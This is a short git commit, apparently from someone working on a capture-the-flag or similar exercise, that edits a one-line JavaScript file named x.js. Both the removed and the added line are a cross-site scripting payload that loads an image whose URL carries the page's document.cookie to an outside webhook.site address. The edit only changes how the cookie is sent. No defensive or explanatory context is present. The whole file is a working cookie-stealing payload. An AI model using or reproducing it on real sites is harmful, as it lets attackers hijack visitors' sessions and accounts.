dfe226e03669324dcb2fd7456c400e7b1ed4a7b0
0xDbgMan <aboud.htb@gmail.com>
2025-11-19 16:37:49 +0200

    Update x.js

--- x.js
+++ x.js
@@ -1,1 +1,1 @@
-new Image().src = "https://webhook.site/6f5d44be-f19c-429a-97fa-52e0cc4d8ea6?c=" + btoa(document.cookie);
+var i=new Image;i.src="https://webhook.site/6f5d44be-f19c-429a-97fa-52e0cc4d8ea6/?cookie="+document.cookie;
